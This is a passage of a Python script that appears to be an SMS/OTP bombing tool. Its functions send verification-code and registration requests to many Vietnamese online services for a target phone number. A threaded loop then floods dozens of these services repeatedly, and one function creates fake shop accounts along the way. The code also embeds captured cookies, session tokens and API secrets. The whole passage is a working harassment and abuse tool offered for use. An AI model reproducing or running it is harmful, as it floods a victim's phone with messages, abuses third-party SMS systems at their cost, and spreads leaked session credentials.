		"Referer": "https://digishop.vnpt.vn/di-dong/spotv10/3061?gad_source=1&gclid=Cj0KCQjwjLGyBhCYARIsAPqTz1-8Vy-_StQqKwMIKcKaSTSHkegTbtSnKR0JWEQYTjqbAuWh8QQc8iQaAp_iEALw_wcB",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"Cookie": "clientId=89762d26d5d2d72c2e31acbdf8c5edf99db62ee5c1ef51931bba1e7e97858cdb; secureKey=eyJhbGciOiJSUzI1NiJ9.eyJyZXF1ZXN0VGltZSI6IjIwMjQwNTIyMTIwNTE3IiwiY2xpZW50SWQiOiI4OTc2MmQyNmQ1ZDJkNzJjMmUzMWFjYmRmOGM1ZWRmOTlkYjYyZWU1YzFlZjUxOTMxYmJhMWU3ZTk3ODU4Y2RiIiwib3MiOiJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjQuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJqdGkiOiIwMmU2OTRhNi01ODJjLTQ3MDgtYWRmZi1mN2ZjOGQ5NmMxMGQiLCJpYXQiOjE3MTYzNTA3MTcsImV4cCI6MTcxNjM1NDkxN30.NGkbvxzgMf2rzkoLZZYGybIAo7zUOoxJ4v87vVc6Gfq1Ra6homqik7h77OW_HkJo5zi5atf91F6-7qc0uUPncjuvK3_NiaAoGO6FBfbFf0H-UOIW5WJRDh8VnUG95v05nmHb63vTAqdQMsAxMV0LiE4qfpzf_5XG4hfanFazVyRx27hXPz-SU1FpX6Q5wjVzG3lAtmLse8N6MovTD_Q70mDuBkteOvWJQKhrW7qb2kVuisUzbdj0937pCfCLd6sZqsft9GAVgkxyp_jtrK2xk3-PCxH3frtxCMiCEJvbynI7g0gi0SG3jcQln2RRK-pCcRskvScv8wodS9E00u9PqjlaqHMD01OkeIV8rWE-y3MypLzZCK0rBLca9Jlaa0hU4yl0UUUZL96Y-53GMg98TP90Gftl0zhvfslOWilSpb9c2XdMvVA-CNx07VQNchbR4GsOLjZkjD1_beU2Pcud9A-CmS5sUZhLeZoY4BuHRdPJvCH0Y3vH4_K13w4LrhuG22WJBYFLePMJWs_gTCoe35cdqLdGOVF50nOWUDJz3ZOzvUUyIriWN0k4iPZbg00LUuXVTfst1V1u_4mXPeV3IXi1OCFZju7KG5eio6p4AyC4o_5KCEVkqybE8LOdENQqfFnV6YusLynWe3BR-2zHHx5tk8CIMCmTZk9l1Z4JQBU; _gcl_aw=GCL.1716354318.Cj0KCQjwjLGyBhCYARIsAPqTz1-8Vy-_StQqKwMIKcKaSTSHkegTbtSnKR0JWEQYTjqbAuWh8QQc8iQaAp_iEALw_wcB; _gcl_au=1.1.1419570150.1716354318; _ga=GA1.1.135967088.1716354318; _fbp=fb.1.1716354318568.1512508122; CJM_S_QPR-O57-ESJ=%22%22; BX_USER_ID=3b3ba09048a1b2acc645e0a667a66701; _ga_BFVVXDGX3E=GS1.1.1716354318.1.1.1716354346.0.0.0"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def naver_live(phone):
	url = "https://nid.naver.com/user2/joinAjax"
		
	params = {
		"m": "sendAuthno",
		"tp": "normal",
		"nationNo": "84",
		"mobno": phone[1:],
		"lang": "en_US",
		"key": "07tvbsIBKL4zS440",
		"id": "vrxxdev"
	}
		
	payload = "nid_kb2=%7B%22uuid%22%3A%2257b6d4ff-2be2-4906-b4e5-3795ea932e54-0%22%2C%22encData%22%3A%22N4IghiBcIKwOwCMBsATALAMwwWgEwIFNds0BOABiWwTQJmwGY5SYCxSHc61tyQAaEAiggAjADoG40gJABjKABcATgFcCglFADaoAJYi9WwREjaQ5fin4BVAHKj%2BuXDMEx%2Bq2w6cvZuGJbW9o7OriAMHl4hvoK4ogAcVlE%2BYRGewSmyonARQd6hsmiRGQWxMAxISSUxIEXp%2BTW4SIl50WHu9W1ZAVUNYZWdmQC6gsKQoKbmlgBufj3Tyn7Z-AsAHllwRWvrZRUryqurxiBNpPuHKATdjtuXsyNCUGi4AL6CCtCyWtC3BLOCV0gGDAABsAM4aEAYKDA8EEN76EQABzBAHcUKJZJMHmMJjoLIIcVByG95CIvuSAUo1JDoUDQRCESADNAkQALAD2ADsCHYOVj8YF%2BHpLN1IiLBIJRKQWsLHLI4OL5VL4rlhbhJSBEp49BrZAxltY9BF9eKTbFyI4jUVTTqbVKGO4je5ZNrhS7BKQzkbKrbhb6LWq9IrXeKQ1LRJUjYlQzqY0TxuBBZrpeaxKrNQb7SdLSmGDHPQGc0XRMsQAn4qSPiAKZ8qZAVOpBHTYYyHoC8YnTKKxqJyNJ3lADZJSbik5A0JJRlAElOyZBRJO4C9SXTO%2Bvx-2TWNRR9eCPp12oCQB48F6ePnBxJXR1AN9252N93q9-3XofO3hD7hr4PIPFrxXUkAHM73HKYAB9RBccgIIYNAkAgtByAYLIINwCDYL4WI4MwzDZFgpAkBlCDsFLGAIPgNDRDw7CTigtBaIIuDNgo7BiNIxdUKlKCmJwzg%2BIsSj-BomAaOwGAYGowSMNweJBNg0tcAYJDKKkniaKwvx0MYrTBEIzY4CglT2LQaS9Po0QVIs2DJMYvAVKQTENJk9DrPw-SoNwchSEQxhSJgeI0IwiyMMdBSkPgmjSFIpA6JozSPMsxCbIglhGPstAgpc0KoJSpLYNwNAYBi7yAtwcykow7IIvgcgMLwQrS0qujqvk1KEgYdzGvi3jcuUiK4iy0jGISJAWu0yMIrgeJSvE6VesS1qkPyujYNVUh5oohJFtcqbUpcDhSKMsi4HUsQ%2BqqqCluY%2BCDVI5woPiOA0Kwq6atSpA0Bo5DOPiMyeJCq6mAisbxM2dDLQmnD9oKiCiNgigHp84LXLQXS4ck2D2JU0RJOh%2Bi5MGmb5rxuCUZyq6jI67z5O83G0G4i63uWoG1ryhgYrIsTSKi169oi%2BIAkoxj4N2-qmITOAQw%2BbIbW%2BOAfPreJoKI5tiVJAArIdnEENkRDAFA5DAfAMGeL0MAIR05EjBgEAYOQkFOMgOAIY4WU7EAAFkOQALz0EEQTAAB6GBxHIAACAAKAAZPQuVUVYAG4I4AQS5FBlA5IwI77FOAGkAEo06RJEQQIAB1AgEHzvRFFDphJCQaP84ACQAFS9mP%2BAjkE9AAawICOAHECDkfuOWLgBhNks4AWwIYPoMnftV4jn2EADoeAGUwGBZQ9Abq8KlkMYQGmPRsAANTsWQPiKzQoD1QEJHich34-uA8f8eAmHV-9BCgTMP9dwyFyAPH1sA4q-AwEPBZCQbyghtYLkEP3GcggQToJAHPEQqguT9y5ByVEXJZAkOgHHBOqwI5gGUHPaYKtZD8mgHgghRCSEmGxIIJEIgEBwHwHAOQcA2COgwIIhAMBDZIEQEgAgKFEDGzAAI2QABHEQ8QCCMy6spaWX8kAIH%2BggFAcUUCkEuBIlA8RCCK1kIsaAqcABKXsAB%2BXtQSX2Hnw9eAAFJmYIYQMkhIofxcJBCqGCRCQQsx6QhJAKicJkJ1hmHcI2DQKSHhgGNpScAcgz6OIABoJDiFiOQ1ZinfBAOnTO2djgZMBGIVe4dil0jEEVcO4gkAVCvDAAG2SgHmGAAAHSEMoMAGchmQCGTPeeehVBzyGfwIZ0wCDKDBHobk4yhnLzaR0qR4hulDJeLIQZwzRkoA2SAYeHIOTAXLhHKZHIF7zMWcs1Z6yoCbNaf2HZXS0AHKOUMhAIyxnvJAHyRQ2BU7iAAEJArOQIZ5Ky1lcnOV6Npq8-npLkJA1skIMkshSSYcpYdI6x3jonFOlSs45zzhHIuJcy6V2rrXeu5Rj7Nyjm3Tu3de4DyHqPcek87mzweYvLZDTI4by3hHXe%2B9D6sqbliOpKSsTNOVSYNB0BLjAlUCCRQEEkTzyREEkwQCQAvRMMg2o78IJnXNeASBUIAlYhZLAOiYAcGsg5MoFQYA65YjIY6uEWJMF1hAAAT3xKnA%2BoJZBTw5KoA%2ByzY3xsTcoCOdgCBxMEKPL1wE9AQEEK3AgIIlmKD0JkwQPsuQZP5IILxoIwBlsIbIduYBORzwLSAduegF5%2BMEN23t6bM0R3sQ80Zsgr7LJQKMiAQwVxAA%22%7D"
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"sec-ch-ua-arch": "\"\"",
		"sec-ch-ua-platform-version": "\"10.0.0\"",
		"x-requested-with": "XMLHttpRequest",
		"dpr": "1.8",
		"downlink": "10",
		"sec-ch-ua-full-version-list": "\"Chromium\";v=\"124.0.6367.54\", \"Google Chrome\";v=\"124.0.6367.54\", \"Not-A.Brand\";v=\"99.0.0.0\"",
		"sec-ch-ua-model": "\"RMX1821\"",
		"sec-ch-ua-platform": "\"Android\"",
		"device-memory": "2",
		"rtt": "50",
		"sec-ch-ua-mobile": "?1",
		"viewport-width": "400",
		"sec-ch-ua-full-version": "\"124.0.6367.54\"",
		"ect": "4g",
		"origin": "https://nid.naver.com",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://nid.naver.com/user2/join/begin?token_sjoin=07tvbsIBKL4zS440&langSelect=en_US&termsLocation=Y&termsEmail=Y&termsEvent=Y",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
		"Cookie": "MM_PF=SEARCH; NNB=4NOFOCBHQBGWM; BUC=J7X4L6K97-rTxJZpR-mAi2kUUSLWnyO0WegvA13381w="
	}
		
	response = requests.post(url, params=params, data=payload, headers=headers)
def ghtk1_live(phone):
	url = "https://web.giaohangtietkiem.vn/api/v1/register-shop/create-register-shop"
	url2 = "https://web.giaohangtietkiem.vn/api/v1/register-shop/send-otp"

	payload = json.dumps({
		"name": "Vrxx Team",
		"tel": phone,
		"password": "@Vrxx1337",
		"confirm_password": "@Vrxx1337",
		"first_address": "Ho chi minh",
		"province": "Tp Hồ Chí Minh",
		"province_id": "126",
		"district": "Huyện Cần Giờ",
		"district_id": "1137",
		"ward": "Thị Trấn Cần Thạnh",
		"ward_id": "1154",
		"hamlet": "Bệnh Viện Huyện Cần Giờ",
		"hamlet_id": "658291"
	})
	
	payload2 = json.dumps({
		"action": "confirm_tel"
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"apptype": "Web",
		"sec-ch-ua-mobile": "?1",
		"uniqdevice": "3bd594cc-c3b0-4eb9-8608-a0e09226549a",
		"authorization": "Bearer null",
		"shop-code": "",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://khachhang.giaohangtietkiem.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://khachhang.giaohangtietkiem.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"apptype": "Web",
		"sec-ch-ua-mobile": "?1",
		"uniqdevice": "3bd594cc-c3b0-4eb9-8608-a0e09226549a",
		"authorization": "",
		"shop-code": "",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://khachhang.giaohangtietkiem.vn",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://khachhang.giaohangtietkiem.vn/",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i"
	}
	
	response = requests.post(url, data=payload, headers=headers)
		
	if response.json().get("success"):
		token = response.json().get("jwt")
		headers2["authorization"] = "Bearer " + token
		response = requests.post(url2, data=payload2, headers=headers2)
def heyu_live(phone):
	url = "https://book.heyu.vn/api/sms/send-code"
		
	payload = json.dumps({
		"phone": phone,
		"regionName": None,
		"nativeVersion": 2027,
		"reqT": int(time.time() * 1000)
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"app-version": "21235",
		"sec-ch-ua-mobile": "?0",
		"authorization": "00b7ee3fa7f9ed4ac3ad8de5b2172fae",
		"sec-ch-ua-platform": "\"Linux\"",
		"origin": "https://book.heyu.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://book.heyu.vn/login",
		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3",
		"priority": "u=1, i",
		"Cookie": "_ga_MNYQVZFJNS=GS1.1.1716360137.1.0.1716360137.0.0.0; _ga=GA1.1.689002627.1716360137"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def mytv_live(phone):
	url = "https://webapi.mytv.vn/api/v1/auth/sendOTP"
		
	params = {
		"uuid": "39a5870747bd013a1a1984312a29d36c",
		"time": datetime.datetime.now().strftime("%Yy%mm%dd_%Hh%Mm%Ss%fms")[:-3]
	}
		
	payload = json.dumps({
		"login_type": 1,
		"email": None,
		"phone": phone,
		"type": 3
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"Accept-Language": "vi",
		"sec-ch-ua-mobile": "?1",
		"macaddress": "de4fdc3b418dce0b82ba3ea99aa69e85",
		"Access-Control-Allow-Origin": "*",
		"withCredentials": "true",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://mytv.com.vn",
		"Sec-Fetch-Site": "cross-site",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://mytv.com.vn/"
	}
		
	response = requests.post(url, params=params, data=payload, headers=headers)
def dominos_live(phone):
	url = "https://dominos.vn/api/v1/users/send-otp"

	payload = json.dumps({
		"phone_number": phone,
		"email": "vrxxdev@gmail.com",
		"type": 0,
		"is_register": True
	})
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Accept": "application/json, text/plain, */*",
		"Accept-Encoding": "gzip, deflate, br, zstd",
		"Content-Type": "application/json",
		"secret": "bPG0upAJLk0gz/2W1baS2Q==",
		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
		"dmn": "ewmpqt",
		"accept-language": "vi",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"origin": "https://dominos.vn",
		"sec-fetch-site": "same-origin",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://dominos.vn/promotion-listing/giam-70-pizza-thu-2?utm_source=IDAC-SEM&utm_medium=cpa&utm_campaign=WDS70&utm_content=Brand-Pizza-Domino&gad_source=1",
		"priority": "u=1, i",
		"Cookie": "_ga_8GXKYDTW3R=GS1.1.1716401231.1.0.1716401231.0.0.0; _ga_12HB7KTL5M=GS1.1.1716401231.1.1.1716401231.60.0.0; _ga=GA1.2.827925655.1716401232; _gid=GA1.2.93918623.1716401232; _gat_UA-41910789-1=1; _fbp=fb.1.1716401232361.521432033; _gcl_au=1.1.454109205.1716401238"
	}
		
	response = requests.post(url, data=payload, headers=headers)
def BBot(phone, amount):
	for i in range(amount):
		threading.submit(mioto_live,phone)
		threading.submit(call1_live,phone)
		threading.submit(fptshop_live,phone)
		threading.submit(vnpt_live,phone)
		threading.submit(naver_live,phone)
		threading.submit(ghtk1_live,phone)
		threading.submit(heyu_live,phone)
		threading.submit(mytv_live,phone)
		threading.submit(dominos_live,phone)
		threading.submit(ensure_live,phone)
		threading.submit(glx_live,phone)
		threading.submit(af_live,phone)
		threading.submit(vsporrts_live,phone)
		threading.submit(vieon_live,phone)
		threading.submit(paynetonline_live,phone)
		threading.submit(cathelife_live,phone)
		threading.submit(oreka_live,phone)
		threading.submit(fm_live,phone)
		threading.submit(vinamilk_live,phone)
		threading.submit(cira_live,phone)
		threading.submit(meta_live,phone)
		threading.submit(ticket_live,phone)
		threading.submit(ssis_live,phone)
		threading.submit(vng_live,phone)
		threading.submit(pico_live,phone)
		threading.submit(aloline_live,phone)
		threading.submit(taximaxim_live,phone)
		threading.submit(furing_live,phone)
		threading.submit(medlatec_live,phone)
		threading.submit(bachhoaxanh_live,phone)
		threading.submit(fuatabus_live,phone)
		threading.submit(traveloka_live,phone)
		threading.submit(rebook_live,phone)
		threading.submit(vtpost_live,phone)
		time.sleep(3)
		threading.submit(vamo_live,phone)
		threading.submit(gapo_live,phone)
		threading.submit(tts1_live,phone)
		threading.submit(vietlot_live,phone)
		threading.submit(nhathuockhanglive,phone)
		threading.submit(chotto_live,phone)
		threading.submit(bds_live,phone)
		threading.submit(tv360_live,phone)
		threading.submit(viettel_live,phone)
		threading.submit(dongcre_live,phone)
		threading.submit(ahamove_live,phone)
		threading.submit(enphase_live,phone)
		threading.submit(jbox_live,phone)
		threading.submit(fmp_live,phone)
		threading.submit(winmart_live,phone)
		threading.submit(sely_live,phone)
		threading.submit(pico_live,phone)
		threading.submit(cellphones_live,phone)
		threading.submit(thefaceshop_live,phone)
		threading.submit(phuclong_live,phone)
		threading.submit(tv361_live,phone)
		threading.submit(madia_live,phone)
		threading.submit(dongplus_live,phone)
		threading.submit(tgdd_live,phone)
		threading.submit(acfc_live,phone)
		threading.submit(lotte_live,phone)
		threading.submit(patino,phone)
		time.sleep(3)
		threading.submit(vietair_live,phone)
		threading.submit(mutosii_live,phone)
		threading.submit(mpro_live,phone)
		threading.submit(cat_live,phone)
		threading.submit(kingfood_live,phone)
		threading.submit(hoangphuc_live,phone)
		threading.submit(gumac_live,phone)
		threading.submit(ghn_live,phone)
		threading.submit(call4_live,phone)
		threading.submit(longchau_live,phone)
		threading.submit(medpro_live,phone)
		threading.submit(beaty_live,phone)
		threading.submit(tokyolife1_live,phone)
		threading.submit(utoapp_live,phone)
		threading.submit(routine_live,phone)
		time.sleep(3)
BBot(phone, amount)
